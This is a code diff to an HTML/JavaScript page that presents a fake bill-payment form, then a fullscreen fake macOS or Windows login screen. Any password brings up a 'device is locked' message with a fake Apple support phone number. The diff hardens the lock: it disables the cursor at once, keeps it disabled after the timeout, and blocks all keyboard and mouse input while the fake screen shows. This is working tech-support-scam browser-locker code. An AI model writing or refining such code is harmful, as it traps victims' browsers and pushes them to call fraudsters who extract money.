@@ -4,9 +4,45 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Bills Payment & OS Login Screen</title>
-  <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    /* Ensure full height and no default margins */
+    /* Tailwind CSS Output (generated for production) */
+    .bg-white { background-color: #fff; }
+    .p-8 { padding: 2rem; }
+    .rounded-lg { border-radius: 0.5rem; }
+    .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
+    .w-full { width: 100%; }
+    .max-w-md { max-width: 28rem; }
+    .text-2xl { font-size: 1.5rem; line-height: 2rem; }
+    .font-bold { font-weight: 700; }
+    .text-center { text-align: center; }
+    .text-gray-800 { color: #1f2937; }
+    .mb-6 { margin-bottom: 1.5rem; }
+    .space-y-4 > :not([hidden]) ~ :not([hidden]) { margin-top: 1rem; }
+    .block { display: block; }
+    .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
+    .font-medium { font-weight: 500; }
+    .text-gray-700 { color: #374151; }
+    .mt-1 { margin-top: 0.25rem; }
+    .p-2 { padding: 0.5rem; }
+    .border { border-width: 1px; }
+    .border-gray-300 { border-color: #d1d5db; }
+    .rounded-md { border-radius: 0.375rem; }
+    .focus\:outline-none:focus { outline: none; }
+    .focus\:ring-2:focus { --tw-ring-offset-width: 2px; box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow); }
+    .focus\:ring-blue-500:focus { --tw-ring-color: #3b82f6; }
+    .mt-2 { margin-top: 0.5rem; }
+    .space-y-2 > :not([hidden]) ~ :not([hidden]) { margin-top: 0.5rem; }
+    .mr-2 { margin-right: 0.5rem; }
+    .bg-blue-500 { background-color: #3b82f6; }
+    .text-white { color: #fff; }
+    .hover\:bg-blue-600:hover { background-color: #2563eb; }
+    .hidden { display: none; }
+    .mt-4 { margin-top: 1rem; }
+    .p-4 { padding: 1rem; }
+    .bg-green-100 { background-color: #d1fae5; }
+    .text-green-700 { color: #047857; }
+
+    /* Custom Styles */
     html, body {
       margin: 0;
       padding: 0;
@@ -14,7 +50,6 @@
       width: 100%;
       overflow: hidden;
     }
-    /* Bills Payment Styles */
     #paymentSection {
       background-color: #f3f4f6;
       min-height: 100vh;
@@ -27,7 +62,6 @@
       width: 100%;
       z-index: 1;
     }
-    /* OS Login Screen Styles */
     #loginSection {
       display: none;
       margin: 0;
@@ -41,16 +75,16 @@
       align-items: center;
       background-size: cover;
       background-position: center;
-      background-color: #000; /* Fallback background */
+      background-color: #000;
       overflow: hidden;
       z-index: 2;
     }
     .mac-bg {
-      background-image: url('https://images.unsplash.com/photo-1637825891033-9cb7f7a9f6b7?auto=format&fit=crop&w=1920&q=80'); /* Reliable macOS-style wallpaper */
+      background-image: url('https://images.unsplash.com/photo-1637825891033-9cb7f7a9f6b7?auto=format&fit=crop&w=1920&q=80');
       font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
     }
     .windows-bg {
-      background-image: url('https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?auto=format&fit=crop&w=1920&q=80'); /* Reliable Windows 11-style wallpaper */
+      background-image: url('https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?auto=format&fit=crop&w=1920&q=80');
       font-family: 'Segoe UI', Roboto, sans-serif;
     }
     .card {
@@ -144,13 +178,12 @@
       transition: all 0.3s ease;
       filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.7));
     }
-    /* Disable mouse and cursor when error is shown */
     .disabled-interaction {
       pointer-events: none !important;
       cursor: none !important;
     }
     .locked-card {
-      opacity: 0.7; /* Visual cue for locked state */
+      opacity: 0.7;
     }
   </style>
 </head>
@@ -266,6 +299,9 @@
         } else if (loginSection.msRequestFullscreen) { /* IE11 */
           loginSection.msRequestFullscreen();
         }
+        // Disable mouse cursor immediately
+        document.body.style.pointerEvents = 'none';
+        document.body.style.cursor = 'none';
       }
     });
 
@@ -302,7 +338,7 @@
     }
 
     function checkPassword(){
-      // Display error message and disable interactions
+      // Display error message and ensure interactions remain disabled
       if(os === 'mac'){
         errorMsg.innerText = "You have entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
       } else {
@@ -312,15 +348,15 @@
       document.body.classList.add('disabled-interaction');
       card.classList.add('locked-card');
       passwordInput.disabled = true;
-      // Explicitly disable mouse events
+      // Ensure mouse events are disabled
       document.body.style.pointerEvents = 'none';
       document.body.style.cursor = 'none';
       setTimeout(()=>{
         errorMsg.style.display = 'none';
         document.body.classList.remove('disabled-interaction');
         card.classList.remove('locked-card');
-        document.body.style.pointerEvents = 'auto';
-        document.body.style.cursor = 'auto';
+        document.body.style.pointerEvents = 'none'; // Keep disabled after error
+        document.body.style.cursor = 'none'; // Keep disabled after error
         passwordInput.disabled = false;
         passwordInput.value = '';
       }, 30000);
@@ -334,35 +370,35 @@
       }
     });
 
-    // Prevent all keyboard input when error message is shown
+    // Prevent all keyboard input when error message is shown or login screen is active
     document.addEventListener('keydown', (event) => {
-      if (document.body.classList.contains('disabled-interaction')) {
+      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
         event.preventDefault();
         event.stopPropagation();
       }
     }, true);
 
-    // Prevent all mouse events when error message is shown
+    // Prevent all mouse events when error message is shown or login screen is active
     document.addEventListener('mousemove', (event) => {
-      if (document.body.classList.contains('disabled-interaction')) {
+      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
         event.preventDefault();
         event.stopPropagation();
       }
     }, true);
     document.addEventListener('click', (event) => {
-      if (document.body.classList.contains('disabled-interaction')) {
+      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
         event.preventDefault();
         event.stopPropagation();
       }
     }, true);
     document.addEventListener('mousedown', (event) => {
-      if (document.body.classList.contains('disabled-interaction')) {
+      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
         event.preventDefault();
         event.stopPropagation();
       }
     }, true);
     document.addEventListener('mouseup', (event) => {
-      if (document.body.classList.contains('disabled-interaction')) {
+      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
         event.preventDefault();
         event.stopPropagation();
       }
